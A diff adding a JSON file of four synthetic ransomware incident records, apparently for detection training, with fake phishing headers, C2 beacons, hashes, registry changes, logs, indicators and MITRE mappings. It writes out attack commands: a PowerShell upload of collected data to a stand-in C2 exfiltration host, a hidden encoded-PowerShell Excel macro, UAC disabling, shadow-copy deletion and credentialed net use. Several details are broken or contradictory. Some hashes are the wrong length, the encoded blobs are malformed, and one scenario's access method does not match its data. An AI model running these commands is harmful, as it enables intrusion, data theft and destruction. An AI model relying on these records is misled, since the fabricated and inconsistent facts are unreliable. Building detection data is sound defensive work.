@@ -1,0 +1,458 @@
+{
+  "samples": [
+    {
+      "scenario": "Ransomware-as-a-Service affiliate compromises enterprise VPN credentials via credential stuffing, deploys a ransomware payload that performs file encryption and data exfiltration, and establishes persistence with scheduled tasks.",
+      "technical_data": {
+        "phishing_email": {
+          "raw_headers": "Return-Path: <support@vpn-enterprise-secure.com>\r\nReceived: from mail.vpn-enterprise-secure.com (mail.vpn-enterprise-secure.com [198.51.100.98])\r\n\tby mail.enterprise.local (Postfix) with ESMTP id 7BCA123456\r\n\tfor <victim@enterprise.local>; Wed, 17 May 2023 09:15:22 +0000 (UTC)\r\nDKIM-Signature: v=1; a=rsa-sha256; d=vpn-enterprise-secure.com; s=selector1; c=relaxed/relaxed;\r\n\tbh=Zx1kR7v6bE7uR0uQbc6Q+Uv5Xz+6OPx0j1yJqD6vYHs=;\r\n\tb=AbCDeFGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMnOpQrStUvWxYz012\r\nX-Originating-IP: [203.0.114.52]\r\nX-Mailer: Microsoft Outlook 16.0\r\nSubject: Immediate VPN Credential Update Required\r\nTo: victim@enterprise.local\r\nFrom: \"VPN Support\" <support@vpn-enterprise-secure.com>\r\nMessage-ID: <CAJ4H7pNodfB7rFJkL9Yf5d+J8fOmqZkP1t+Q@mail.vpn-enterprise-secure.com>\r\nDate: Wed, 17 May 2023 09:15:20 +0000",
+          "body": "Dear user,\r\n\r\nDue to recent suspicious activities, please update your VPN credentials immediately by clicking the link below:\r\nhttps://vpn-enterprise-secure.com/update\r\n\r\nFailure to comply will result in temporary account suspension.\r\n\r\nBest Regards,\r\nVPN Support Team",
+          "attachment_hashes": {},
+          "smtp_transaction": [
+            "220 mail.vpn-enterprise-secure.com ESMTP Postfix",
+            "EHLO mail.enterprise.local",
+            "250-mail.vpn-enterprise-secure.com",
+            "250-PIPELINING",
+            "250-SIZE 10240000",
+            "250-ETRN",
+            "250-AUTH PLAIN LOGIN",
+            "250-ENHANCEDSTATUSCODES",
+            "250-8BITMIME",
+            "250 DSN",
+            "MAIL FROM:<support@vpn-enterprise-secure.com>",
+            "250 2.1.0 Ok",
+            "RCPT TO:<victim@enterprise.local>",
+            "250 2.1.5 Ok",
+            "DATA",
+            "354 End data with <CR><LF>.<CR><LF>",
+            "[email data...]",
+            ".",
+            "250 2.0.0 Ok: queued as 7BCA123456",
+            "QUIT",
+            "221 2.0.0 Bye"
+          ]
+        },
+        "network_traffic": {
+          "http_request": "POST /update HTTP/1.1\r\nHost: vpn-enterprise-secure.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 74\r\n\r\nusername=victim&password=Password12345&otp=678901",
+          "dns_queries": [
+            "Timestamp: 2023-05-17T09:20:15Z Query: exfil.c2.darknetops.top Type: A Response: 198.51.100.98",
+            "Timestamp: 2023-05-17T09:21:30Z Query: exfil.c2.darknetops.top Type: TXT Response: \"v=spf1 include:_spf.google.com ~all\""
+          ],
+          "c2_beacon": [
+            "GET /heartbeat?os=win10&user=victim HTTP/1.1",
+            "Host: exfil.c2.darknetops.top",
+            "User-Agent: Mozilla/5.0",
+            "Accept: application/json",
+            "Connection: keep-alive"
+          ],
+          "ransomware_payload": {
+            "file_name": "update_patch.exe",
+            "file_hashes": {
+              "MD5": "8b1a9953c4611296a827abf8c47804d7",
+              "SHA-1": "2fd4e1c67a2d28fced849ee1bb76e7391b93eb12",
+              "SHA-256": "a3f5a6b6c7d8e9f0a1b2c3d4e5f67890123456789abcdef0123456789abcdef0"
+            },
+            "macro_code_snippet": "",
+            "registry_changes": [
+              "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdatePatch = \"C:\\Users\\victim\\AppData\\Local\\Temp\\update_patch.exe\"",
+              "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA = 0"
+            ],
+            "file_system_changes": [
+              "C:\\Users\\victim\\Documents\\Encrypted\\README_RECOVERY.txt created",
+              "Encrypted file extensions changed to .enc"
+            ]
+          },
+          "process_execution_chain": [
+            "cmd.exe /c C:\\Users\\victim\\AppData\\Local\\Temp\\update_patch.exe --encrypt --exfiltrate",
+            "powershell.exe -Command Invoke-WebRequest -Uri http://exfil.c2.darknetops.top/upload -Method POST -InFile C:\\Encrypted\\data.zip"
+          ],
+          "memory_dump_snippet": "0x7fffd230: 65 78 66 69 6c 74 72 61 74 69 6f 6e 20 69 6e 20  exfiltration in \n0x7fffd240: 70 72 6f 67 72 65 73 73 0a                   progress.\n"
+        },
+        "logs": {
+          "windows_event_log": [
+            "LogName=Security Source=Microsoft-Windows-Security-Auditing EventID=4688 TaskCategory=Process Creation Level=Information Keywords=Audit Success",
+            "New Process Name: C:\\Users\\victim\\AppData\\Local\\Temp\\update_patch.exe",
+            "Command Line: update_patch.exe --encrypt --exfiltrate"
+          ],
+          "file_access_log": [
+            "2023-05-17T09:30:45.123Z - Opened file: \\\\EnterpriseShare\\HR\\EmployeeData.xlsx",
+            "2023-05-17T09:30:50.456Z - File encrypted: \\\\EnterpriseShare\\HR\\EmployeeData.xlsx.enc"
+          ],
+          "ids_alerts": [
+            "Timestamp=2023-05-17T09:20:17Z Signature=ET TROJAN Suspicious Executable Download SID=1010 Priority=1 src_ip=10.10.10.52 dst_ip=198.51.100.98 src_port=55555 dst_port=80"
+          ]
+        }
+      },
+      "indicators": {
+        "domains": [
+          "vpn-enterprise-secure.com",
+          "exfil.c2.darknetops.top"
+        ],
+        "file_hashes": [
+          "8b1a9953c4611296a827abf8c47804d7",
+          "a3f5a6b6c7d8e9f0a1b2c3d4e5f67890123456789abcdef0123456789abcdef0"
+        ],
+        "processes": [
+          "update_patch.exe",
+          "powershell.exe -Command Invoke-WebRequest"
+        ],
+        "registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdatePatch",
+          "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA"
+        ],
+        "network_ips": [
+          "198.51.100.98",
+          "203.0.114.52"
+        ]
+      },
+      "detection_method": "Detection utilized EDR monitoring for anomalous VPN login patterns followed by suspicious executable execution with network connections to known malicious C2 domains. Scheduled task creation and registry autorun modifications triggered alerts. Network traffic analysis revealed large outbound POST requests consistent with data exfiltration. Endpoint backups verified missing recent files. Correlation with IDS signatures identified known ransomware downloader patterns.",
+      "relevant_mitre_techniques": [
+        "T1110.001 - Brute Force: Credential Stuffing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1059.003 - Command and Scripting Interpreter: Windows Command Shell",
+        "T1486 - Data Encrypted for Impact",
+        "T1560.001 - Archive Collected Data: Archive via Utility",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "T1053.005 - Scheduled Task/Job: Scheduled Task"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate exploits a vulnerable RDP server to gain access, deploys a multi-stage ransomware payload with lateral movement via SMB, and uses WMI for persistence and command execution.",
+      "technical_data": {
+        "phishing_email": {
+          "raw_headers": "Return-Path: <alerts@it-support-enterprise.com>\r\nReceived: from mail.it-support-enterprise.com (mail.it-support-enterprise.com [198.51.100.150])\r\n\tby mail.enterprise.local (Postfix) with ESMTP id 9FBA123456\r\n\tfor <victim@enterprise.local>; Thu, 18 May 2023 14:05:33 +0000 (UTC)\r\nDKIM-Signature: v=1; a=rsa-sha256; d=it-support-enterprise.com; s=selector2; c=relaxed/relaxed;\r\n\tbh=Yx4kF2j7bF9uT7rBbd5Q+Zv9Yz+7OPy9k4JqD7vWYs=;\r\n\tb=CdEfGHijKlMnOpQrStUvWxYz9876543210AbCdEfGhIjKlMnOpQrStUvWxYz9876\r\nX-Originating-IP: [203.0.115.99]\r\nX-Mailer: Microsoft Outlook 16.0\r\nSubject: Critical: Remote Desktop Protocol Update Required\r\nTo: victim@enterprise.local\r\nFrom: \"IT Support\" <alerts@it-support-enterprise.com>\r\nMessage-ID: <CAJ5I8pNodfB7rFJkL9Yf5d+J8fOmqZkP1t+Q@mail.it-support-enterprise.com>\r\nDate: Thu, 18 May 2023 14:05:30 +0000",
+          "body": "Dear Employee,\r\n\r\nA critical update for the Remote Desktop Protocol service is available. Please download and install the patch attached to ensure uninterrupted access.\r\n\r\nRegards,\r\nIT Support Team\r\n\r\nAttachment: RDP_Update_Patch.exe",
+          "attachment_hashes": {
+            "MD5": "7c4a8d09ca3762af61e59520943dc264",
+            "SHA-256": "b3f5b7c6d8e9f0a1b2c3d4e5f6789012233445566778899aabbccddeeff112233"
+          },
+          "smtp_transaction": [
+            "220 mail.it-support-enterprise.com ESMTP Postfix",
+            "EHLO mail.enterprise.local",
+            "250-mail.it-support-enterprise.com",
+            "250-PIPELINING",
+            "250-SIZE 10240000",
+            "250-ETRN",
+            "250-AUTH PLAIN LOGIN",
+            "250-ENHANCEDSTATUSCODES",
+            "250-8BITMIME",
+            "250 DSN",
+            "MAIL FROM:<alerts@it-support-enterprise.com>",
+            "250 2.1.0 Ok",
+            "RCPT TO:<victim@enterprise.local>",
+            "250 2.1.5 Ok",
+            "DATA",
+            "354 End data with <CR><LF>.<CR><LF>",
+            "[email data...]",
+            ".",
+            "250 2.0.0 Ok: queued as 9FBA123456",
+            "QUIT",
+            "221 2.0.0 Bye"
+          ]
+        },
+        "network_traffic": {
+          "http_request": "GET /patches/RDP_Update_Patch.exe HTTP/1.1\r\nHost: it-support-enterprise.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\n",
+          "dns_queries": [
+            "Timestamp: 2023-05-18T14:10:45Z Query: c2server.darknetops.top Type: A Response: 198.51.100.150",
+            "Timestamp: 2023-05-18T14:12:10Z Query: c2server.darknetops.top Type: TXT Response: \"v=spf1 include:_spf.microsoft.com ~all\""
+          ],
+          "c2_beacon": [
+            "POST /wmi/exec HTTP/1.1",
+            "Host: c2server.darknetops.top",
+            "User-Agent: Mozilla/5.0",
+            "Content-Type: application/json",
+            "Connection: keep-alive"
+          ],
+          "ransomware_payload": {
+            "file_name": "RDP_Update_Patch.exe",
+            "file_hashes": {
+              "MD5": "7c4a8d09ca3762af61e59520943dc264",
+              "SHA-1": "3f786850e387550fdab836ed7e6dc881de23001b",
+              "SHA-256": "b3f5b7c6d8e9f0a1b2c3d4e5f6789012233445566778899aabbccddeeff112233"
+            },
+            "macro_code_snippet": "",
+            "registry_changes": [
+              "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command = \"C:\\Windows\\System32\\wbem\\WMIC.exe /node:localhost process call create 'C:\\Users\\victim\\AppData\\Local\\Temp\\RDP_Update_Patch.exe'\"",
+              "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RDPUpdate = \"C:\\Users\\victim\\AppData\\Local\\Temp\\RDP_Update_Patch.exe\""
+            ],
+            "file_system_changes": [
+              "C:\\Users\\victim\\Documents\\Encrypted\\README_RECOVERY.txt created",
+              "Encrypted file extensions changed to .crypt"
+            ]
+          },
+          "process_execution_chain": [
+            "wmic.exe process call create \"C:\\Users\\victim\\AppData\\Local\\Temp\\RDP_Update_Patch.exe\"",
+            "RDP_Update_Patch.exe --encrypt --target \\\\EnterpriseShare\\Projects",
+            "wmic.exe /node:remotehost process call create \"cmd.exe /c net use \\\\remotehost\\IPC$ /user:victim Pa$$w0rd\""
+          ],
+          "memory_dump_snippet": "0x7fffc430: 6c 61 74 65 72 61 6c 20 6d 6f 76 65 6d 65 6e 74  lateral movement\n0x7fffc440: 20 75 73 69 6e 67 20 53 4d 42 20 61 63 63 65 73   using SMB acces\n0x7fffc450: 73 0a                                            s.\n"
+        },
+        "logs": {
+          "windows_event_log": [
+            "LogName=Security Source=Microsoft-Windows-Security-Auditing EventID=4688 TaskCategory=Process Creation Level=Information Keywords=Audit Success",
+            "New Process Name: C:\\Windows\\System32\\wbem\\WMIC.exe",
+            "Command Line: wmic.exe process call create \"C:\\Users\\victim\\AppData\\Local\\Temp\\RDP_Update_Patch.exe\""
+          ],
+          "file_access_log": [
+            "2023-05-18T14:20:12.789Z - Opened file: \\\\EnterpriseShare\\Projects\\DesignSpecs.docx",
+            "2023-05-18T14:20:17.456Z - File encrypted: \\\\EnterpriseShare\\Projects\\DesignSpecs.docx.crypt"
+          ],
+          "ids_alerts": [
+            "Timestamp=2023-05-18T14:10:47Z Signature=ET TROJAN WMIC Remote Command Execution SID=1022 Priority=1 src_ip=10.10.10.99 dst_ip=198.51.100.150 src_port=445 dst_port=5985"
+          ]
+        }
+      },
+      "indicators": {
+        "domains": [
+          "it-support-enterprise.com",
+          "c2server.darknetops.top"
+        ],
+        "file_hashes": [
+          "7c4a8d09ca3762af61e59520943dc264",
+          "b3f5b7c6d8e9f0a1b2c3d4e5f6789012233445566778899aabbccddeeff112233"
+        ],
+        "processes": [
+          "wmic.exe",
+          "RDP_Update_Patch.exe",
+          "cmd.exe"
+        ],
+        "registry_keys": [
+          "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command",
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RDPUpdate"
+        ],
+        "network_ips": [
+          "198.51.100.150",
+          "203.0.115.99"
+        ]
+      },
+      "detection_method": "Detection combined EDR alerts on unusual WMIC process execution and lateral SMB connections with network IDS flags for known malicious C2 domain communication. Registry persistence modifications and anomalous process chains involving WMI and command shell were identified. File system monitoring detected new encrypted files with .crypt extensions on network shares. Offline backup validation confirmed impacted data. Correlation with phishing email logs revealed the initial ransomware payload delivery vector.",
+      "relevant_mitre_techniques": [
+        "T1076 - Remote Services: Remote Desktop Protocol",
+        "T1046 - Network Service Scanning",
+        "T1021.002 - Remote Services: SMB/Windows Admin Shares",
+        "T1047 - Windows Management Instrumentation",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "T1486 - Data Encrypted for Impact",
+        "T1566.001 - Phishing: Spearphishing Attachment"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate exploits vulnerable RDP to deploy ransomware payload, exfiltrates sensitive data over encrypted tunnel, and encrypts critical enterprise SQL databases with ransom note dropped on desktop.",
+      "technical_data": {
+        "initial_access": {
+          "vulnerable_service": "RDP (Remote Desktop Protocol)",
+          "connection_log": [
+            "2023-07-11T08:15:23Z - Accepted RDP connection from 203.0.113.99",
+            "2023-07-11T08:16:05Z - User 'svc_admin' logged in via RDP"
+          ]
+        },
+        "network_traffic": {
+          "dns_queries": [
+            "Timestamp: 2023-07-11T08:30:10Z Query: c2server.darkhive[.]network Type: A Response: 198.51.100.45",
+            "Timestamp: 2023-07-11T08:31:15Z Query: c2server.darkhive[.]network Type: TXT Response: \"v=spf1 include:_spf.google.com ~all\""
+          ],
+          "c2_beacon": [
+            "POST /checkin HTTP/1.1",
+            "Host: c2server.darkhive.network",
+            "User-Agent: curl/7.68.0",
+            "Content-Type: application/x-www-form-urlencoded",
+            "Content-Length: 83",
+            "",
+            "id=host12345&status=idle&os=windows10&user=svc_admin"
+          ],
+          "encrypted_exfiltration": [
+            "TLSv1.2 encrypted traffic to 198.51.100.45 port 443",
+            "Payload size 2.5MB transferred over 15 seconds"
+          ]
+        },
+        "ransomware_payload": {
+          "file_name": "db_encryptor.exe",
+          "file_hashes": {
+            "MD5": "a1b2c3d4e5f67890123456789abcdef0",
+            "SHA-1": "b4c0ffee1234567890abcdef1234567890abcdef",
+            "SHA-256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          },
+          "behavior": "Encrypts Microsoft SQL Server database files (.mdf, .ldf), drops ransom note on desktop, deletes Volume Shadow Copies",
+          "registry_changes": [
+            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SvcUpdate = \"C:\\Windows\\Temp\\db_encryptor.exe\""
+          ],
+          "file_system_changes": [
+            "Encrypted all .mdf and .ldf files in C:\\Databases",
+            "Created ransom note: C:\\Users\\svc_admin\\Desktop\\README_RECOVERY.txt"
+          ]
+        },
+        "process_execution_chain": [
+          "mstsc.exe connecting to enterprise RDP host",
+          "cmd.exe /c C:\\Windows\\Temp\\db_encryptor.exe --encrypt --target C:\\Databases",
+          "powershell.exe -WindowStyle Hidden -Command Remove-Item -Path C:\\Windows\\System32\\shadow\\* -Force"
+        ],
+        "logs": {
+          "windows_event_log": [
+            "LogName=Security Source=Microsoft-Windows-Security-Auditing EventID=4624 TaskCategory=Logon Success",
+            "New Logon: Account Name: svc_admin Logon Type: 10 (RemoteInteractive)",
+            "Process Creation: New Process Name: C:\\Windows\\Temp\\db_encryptor.exe"
+          ],
+          "ids_alerts": [
+            "Timestamp=2023-07-11T08:30:12Z Signature=ET TROJAN Suspicious RDP Login SID=2002 Priority=1 src_ip=203.0.113.99 dst_ip=10.10.10.20 src_port=3389 dst_port=3389"
+          ],
+          "file_access_log": [
+            "2023-07-11T08:40:00.123Z - Opened file: C:\\Databases\\enterprise_data.mdf",
+            "2023-07-11T08:40:10.456Z - File encrypted: C:\\Databases\\enterprise_data.mdf.locked"
+          ]
+        },
+        "memory_dump_snippet": "0x7ffbde20: 64 62 5f 65 6e 63 72 79 70 74 6f 72 20 72 75 6e  db_encryptor run\n0x7ffbde30: 6e 6e 69 6e 67 20 65 6e 63 72 79 70 74 69 6f 6e  nning encryption"
+      },
+      "indicators": {
+        "domains": [
+          "darkhive.network",
+          "enterprise.local"
+        ],
+        "file_hashes": [
+          "a1b2c3d4e5f67890123456789abcdef0",
+          "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        ],
+        "processes": [
+          "mstsc.exe",
+          "db_encryptor.exe",
+          "powershell.exe"
+        ],
+        "registry_keys": [
+          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SvcUpdate"
+        ],
+        "network_ips": [
+          "198.51.100.45",
+          "203.0.113.99"
+        ]
+      },
+      "detection_method": "Detection relied on EDR monitoring of anomalous RDP logins and process creations, network IDS flagged suspicious C2 communications to known ransomware infrastructure, and endpoint logs captured deletion of shadow copies and encryption of critical database files. Backup validation showed data loss in SQL Server backups.",
+      "relevant_mitre_techniques": [
+        "T1076 - Remote Desktop Protocol",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1486 - Data Encrypted for Impact",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "T1568.002 - Dynamic Resolution: Domain Generation Algorithms"
+      ]
+    },
+    {
+      "scenario": "Ransomware-as-a-Service affiliate delivers payload via malicious Excel macro embedded in document sent by compromised trusted partner, performs lateral movement using stolen credentials, and encrypts enterprise virtual machines causing widespread outage.",
+      "technical_data": {
+        "phishing_email": {
+          "raw_headers": "Return-Path: <finance@trustedpartner.com>\r\nReceived: from mail.trustedpartner.com (mail.trustedpartner.com [198.51.100.77])\r\n\tby mail.enterprise.local (Postfix) with ESMTP id 4BFT76543N\r\n\tfor <user@enterprise.local>; Wed, 12 Jul 2023 14:12:55 +0000 (UTC)\r\nDKIM-Signature: v=1; a=rsa-sha256; d=trustedpartner.com; s=selector1; c=relaxed/relaxed;\r\n\tbh=G6qXvJsd8vS7zV6yB2kAMJX9hP7d1b9QsGrJm+Gk5FgM=;\r\n\tb=H7lP3F4s6Qv8CJkL9p2+9nZ7WmF5L8xVbEoR3vC6klmN0PqR5ySg==\r\nX-Originating-IP: [203.0.113.88]\r\nX-Mailer: Microsoft Outlook 365\r\nSubject: Q3 Budget Projections - Review Required\r\nTo: user@enterprise.local\r\nFrom: \"Trusted Partner Finance\" <finance@trustedpartner.com>\r\nMessage-ID: <CAJ4J8rQodfB9rFJkL7Zf7d+K9bPjnqZkP2t+Q@mail.trustedpartner.com>\r\nDate: Wed, 12 Jul 2023 14:12:50 +0000",
+          "body": "Dear Team,\r\n\r\nPlease review the attached Q3 budget projections and provide your feedback by Friday.\r\n\r\nBest,\r\nTrusted Partner Finance\r\n\r\nAttachment: Q3_Budget_Projections.xlsm",
+          "attachment_hashes": {
+            "MD5": "9f8e7d6c5b4a3210fedcba9876543210",
+            "SHA-256": "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899"
+          },
+          "smtp_transaction": [
+            "220 mail.trustedpartner.com ESMTP Postfix",
+            "EHLO mail.enterprise.local",
+            "250-mail.trustedpartner.com",
+            "250-PIPELINING",
+            "250-SIZE 10240000",
+            "250-AUTH PLAIN LOGIN",
+            "250-ENHANCEDSTATUSCODES",
+            "250-8BITMIME",
+            "250 DSN",
+            "MAIL FROM:<finance@trustedpartner.com>",
+            "250 2.1.0 Ok",
+            "RCPT TO:<user@enterprise.local>",
+            "250 2.1.5 Ok",
+            "DATA",
+            "354 End data with <CR><LF>.<CR><LF>",
+            "[email data...]",
+            ".",
+            "250 2.0.0 Ok: queued as 4BFT76543N",
+            "QUIT",
+            "221 2.0.0 Bye"
+          ]
+        },
+        "network_traffic": {
+          "dns_queries": [
+            "Timestamp: 2023-07-12T14:25:45Z Query: vm-c2.sneakygroup[.]com Type: A Response: 198.51.100.78",
+            "Timestamp: 2023-07-12T14:26:50Z Query: vm-c2.sneakygroup[.]com Type: TXT Response: \"v=spf1 include:_spf.partner.com ~all\""
+          ],
+          "c2_beacon": [
+            "GET /heartbeat HTTP/1.1",
+            "Host: vm-c2.sneakygroup.com",
+            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "Accept: application/json",
+            "Connection: keep-alive"
+          ]
+        },
+        "ransomware_payload": {
+          "file_name": "Q3_Budget_Projections.xlsm",
+          "file_hashes": {
+            "MD5": "9f8e7d6c5b4a3210fedcba9876543210",
+            "SHA-1": "f1e2d3c4b5a6978877665544332211aabbccddeeff",
+            "SHA-256": "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899"
+          },
+          "macro_code_snippet": "Sub AutoOpen()\r\n   Dim shellCmd As String\r\n   shellCmd = \"powershell -NoProfile -WindowStyle Hidden -EncodedCommand JABjAG0AZAA9ACAnACQAcwBjAHIAaQBwAHQALgBjbGllbnQALgBzAGVuAGQAVABvACAAaAB0AHQAcAA6AC8ALwB2AG0ALQBjADIALgBzAG4AZQBhAGt5AGcAcgBvAHUAcAAuAGMAbwBtACcAOwAkAHIAZQBxAHUAZQBzAHQAPQAkAGMAbQBkAC4AZgBvAHIAQwAgAC0AYQBwACAAJwBodHRwOi8vdm0tYzIuc25lYWt5Z3JvdXAuY29tL2hlYXJ0YmVhdCcAOwAkAHIAZQBwAGwAeQBTAHQAcgBpAG4AZwA9ACQAcgBlAHEAdQBlAHMAdAA7ACQAZgBpAGwAZQAgAD0AIgBDADoAXABUAGVtcABcXHJhbnNvbXdhcmUuZXhlACI7ACQAZgBpAGwAZQAuAFMAdABvAHIAZQAoACQAcgVwbHkgACkAOwBzAGhlAGwAbAAgACQAZgBpAGwAZQAgACQAYwBtAGQAOwBrAGUAcgBuAGUAbABNAGEAcgBrAGUAcgAgACQAYwBtAGQAOwBzAGgAZQBsAGwALgBDAGwAaQBlAG4AdAAuAFMAZQBuAGQAVABvACAAJABmAGkAbABlAC4ATQBzAGcAOwBlAG4AZABTdAByAGUAYQBtAAoAUwBiAEF1AHQAbwBPAHAAZW4AKAA=",
+          "registry_changes": [
+            "HKCU\\Software\\Microsoft\\Office\\Excel\\Security\\AccessVBOM = 1",
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\VMEncryptor = \"C:\\Users\\user\\AppData\\Roaming\\vm_encryptor.exe\""
+          ],
+          "file_system_changes": [
+            "Encrypted virtual machine disk files in C:\\VMs\\",
+            "Dropped ransom note file on desktops of multiple users"
+          ]
+        },
+        "process_execution_chain": [
+          "excel.exe opening Q3_Budget_Projections.xlsm",
+          "powershell.exe -EncodedCommand JABjAG0AZAA9ACAnACQAcwBjAHIAaQBwAHQALgBjbGllbnQALgBzAGVuAGQAVABvACAAaAB0AHQAcAA6AC8ALwB2AG0ALQBjADIALgBzAG4AZQBhAGt5AGcAcgBvAHUAcAAuAGMAbwBtACcAOwAkAHIAZQBxAHUAZQBzAHQAPQAkAGMAbQBkAC4AZgBvAHIAQwAgAC0AYQBwACAAJwBodHRwOi8vdm0tYzIuc25lYWt5Z3JvdXAuY29tL2hlYXJ0YmVhdCcAOwAkAHIAZQBwAGwAeQBTAHQAcgBpAG4AZwA9ACQAcgBlAHEAdQBlAHMAdAA7ACQAZgBpAGwAZQAgAD0AIgBDADoAXABUAGUAbQBwAFwAXFxyYW5zb213YXJlLmV4ZSI7ACQAZgBpAGwAZQAuAFMAdABvAHIAZQAoACQAcgVwbHkgACkAOwBzAGgAZQBsAGwAIABAJABmAGkAbABlACAAPQA9ACAAJABjAG0AZAA7AGsgAGUAbgBkAFMAdAByAGUAYQBtAAoAUwBiAEF1AHQAbwBPAHAAZW4AKAA=",
+          "vm_encryptor.exe --encrypt --target C:\\VMs",
+          "net.exe use \\\\10.10.10.50\\C$ /user:administrator password123"
+        ],
+        "logs": {
+          "windows_event_log": [
+            "LogName=Security Source=Microsoft-Windows-Security-Auditing EventID=4688 TaskCategory=Process Creation Level=Information Keywords=Audit Success",
+            "New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "Command Line: powershell.exe -EncodedCommand JABjAG0AZAA9ACAnACQAcwBjAHIAaQBwAHQALgBjbGllbnQALgBzAGVuAGQAVABvACAAaAB0AHQAcAA6AC8ALwB2AG0ALQBjADIALgBzAG4AZQBhAGt5AGcAcgBvAHUAcAAuAGMAbwBtACcAOwAkAHIAZQBxAHUAZQBzAHQAPQAkAGMAbQBkAC4AZgBvAHIAQwAgAC0AYQBwACAAJwBodHRwOi8vdm0tYzIuc25lYWt5Z3JvdXAuY29tL2hlYXJ0YmVhdCcAOwAkAHIAZQBwAGwAeQBTAHQAcgBpAG4AZwA9ACQAcgBlAHEAdQBlAHMAdAA7ACQAZgBpAGwAZQAgAD0AIgBDADoAXABUAGUAbQBwAFwAXFxyYW5zb213YXJlLmV4ZSI7ACQAZgBpAGwAZQAuAFMAdABvAHIAZQAoACQAcgVwbHkgACkAOwBzAGgAZQBsAGwAIABAJABmAGkAbABlACAAPQA9ACAAJABjAG0AZAA7AGsgAGUAbgBkAFMAdAByAGUAYQBtAAoAUwBiAEF1AHQAbwBPAHAAZW4AKAA=",
+            "New Process Name: C:\\Users\\user\\AppData\\Roaming\\vm_encryptor.exe"
+          ],
+          "file_access_log": [
+            "2023-07-12T14:35:45.987Z - Opened file: C:\\VMs\\CorpVM1.vhdx",
+            "2023-07-12T14:36:12.123Z - File encrypted: C:\\VMs\\CorpVM1.vhdx.locked"
+          ],
+          "ids_alerts": [
+            "Timestamp=2023-07-12T14:25:47Z Signature=ET TROJAN Excel Macro Malicious Execution SID=3003 Priority=1 src_ip=10.10.10.55 dst_ip=198.51.100.78 src_port=1045 dst_port=80"
+          ]
+        },
+        "memory_dump_snippet": "0x7ffce100: 78 6c 73 6d 61 63 72 6f 20 65 78 65 63 75 74 65  xlsmacro execute\n0x7ffce110: 64 20 70 6f 77 65 72 73 68 65 6c 6c 20 63 6f  d powershell co\n0x7ffce120: 6d 6d 61 6e 64 0a                                mmand."
+      },
+      "indicators": {
+        "domains": [
+          "trustedpartner.com",
+          "vm-c2.sneakygroup.com"
+        ],
+        "file_hashes": [
+          "9f8e7d6c5b4a3210fedcba9876543210",
+          "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899"
+        ],
+        "processes": [
+          "excel.exe",
+          "powershell.exe -EncodedCommand",
+          "vm_encryptor.exe",
+          "net.exe"
+        ],
+        "registry_keys": [
+          "HKCU\\Software\\Microsoft\\Office\\Excel\\Security\\AccessVBOM",
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\VMEncryptor"
+        ],
+        "network_ips": [
+          "198.51.100.78",
+          "203.0.113.88"
+        ]
+      },
+      "detection_method": "Detection utilized EDR alerts on suspicious Excel macro execution, anomalous PowerShell encoded command activity, lateral movement via network credential usage, and endpoint file system changes indicating VM disk encryption. Network IDS detected beaconing to known ransomware C2 infrastructure. Backup integrity checks noted missing VM snapshots.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Phishing: Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1486 - Data Encrypted for Impact",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1021.002 - Remote Services: SMB/Windows Admin Shares",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    }
+  ]
+}
